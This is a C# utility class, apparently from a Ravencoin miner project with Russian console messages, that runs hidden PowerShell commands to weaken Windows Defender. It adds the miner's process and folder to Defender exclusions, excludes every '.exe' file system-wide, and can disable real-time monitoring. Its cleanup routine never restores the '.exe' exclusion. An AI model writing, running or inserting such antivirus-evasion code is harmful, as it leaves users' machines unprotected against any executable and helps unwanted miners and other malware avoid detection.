using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Threading.Tasks;

namespace RvnMiner.Utils
{
    public class DefenderManager
    {
        private static readonly string ExeName = "rvn-miner.exe";
        private static readonly string ExePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, ExeName);

        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static async Task<bool> AddToDefenderExclusionsAsync()
        {
            if (!IsAdministrator())
            {
                Console.WriteLine("Требуются права администратора для добавления в исключения Windows Defender");
                return false;
            }

            try
            {
                Console.WriteLine("Добавляем майнер в исключения Windows Defender...");

                // Добавляем процесс в исключения
                await ExecutePowerShellCommandAsync($"Add-MpPreference -ExclusionProcess \"{ExePath}\"");

                // Добавляем папку в исключения
                await ExecutePowerShellCommandAsync($"Add-MpPreference -ExclusionPath \"{AppDomain.CurrentDomain.BaseDirectory}\"");

                // Добавляем .exe файл в исключения
                await ExecutePowerShellCommandAsync($"Add-MpPreference -ExclusionExtension \".exe\"");

                Console.WriteLine("Майнер успешно добавлен в исключения Windows Defender");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при добавлении в исключения: {ex.Message}");
                return false;
            }
        }

        public static async Task<bool> RemoveFromDefenderExclusionsAsync()
        {
            if (!IsAdministrator())
            {
                Console.WriteLine("Требуются права администратора для удаления из исключений Windows Defender");
                return false;
            }

            try
            {
                Console.WriteLine("Удаляем майнер из исключений Windows Defender...");

                // Удаляем процесс из исключений
                await ExecutePowerShellCommandAsync($"Remove-MpPreference -ExclusionProcess \"{ExePath}\"");

                // Удаляем папку из исключений
                await ExecutePowerShellCommandAsync($"Remove-MpPreference -ExclusionPath \"{AppDomain.CurrentDomain.BaseDirectory}\"");

                Console.WriteLine("Майнер успешно удален из исключений Windows Defender");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при удалении из исключений: {ex.Message}");
                return false;
            }
        }

        public static async Task<bool> CheckDefenderStatusAsync()
        {
            try
            {
                var output = await ExecutePowerShellCommandAsync("Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess");
                return output.Contains(ExePath);
            }
            catch
            {
                return false;
            }
        }

        private static async Task<string> ExecutePowerShellCommandAsync(string command)
        {
            return await Task.Run(() =>
            {
                try
                {
                    using (var process = new Process())
                    {
                        process.StartInfo.FileName = "powershell.exe";
                        process.StartInfo.Arguments = $"-Command \"{command}\"";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.Verb = "runas";

                        process.Start();

                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        process.WaitForExit();

                        if (!string.IsNullOrEmpty(error))
                        {
                            Console.WriteLine($"PowerShell Error: {error}");
                        }

                        return output;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка выполнения PowerShell команды: {ex.Message}");
                    return string.Empty;
                }
            });
        }

        public static async Task<bool> DisableRealtimeMonitoringAsync()
        {
            if (!IsAdministrator())
            {
                Console.WriteLine("Требуются права администратора для отключения мониторинга");
                return false;
            }

            try
            {
                Console.WriteLine("Отключаем мониторинг в реальном времени...");
                await ExecutePowerShellCommandAsync("Set-MpPreference -DisableRealtimeMonitoring $true");
                Console.WriteLine("Мониторинг в реальном времени отключен");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при отключении мониторинга: {ex.Message}");
                return false;
            }
        }

        public static async Task<bool> EnableRealtimeMonitoringAsync()
        {
            if (!IsAdministrator())
            {
                return false;
            }

            try
            {
                Console.WriteLine("Включаем мониторинг в реальном времени...");
                await ExecutePowerShellCommandAsync("Set-MpPreference -DisableRealtimeMonitoring $false");
                Console.WriteLine("Мониторинг в реальном времени включен");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при включении мониторинга: {ex.Message}");
                return false;
            }
        }
    }
}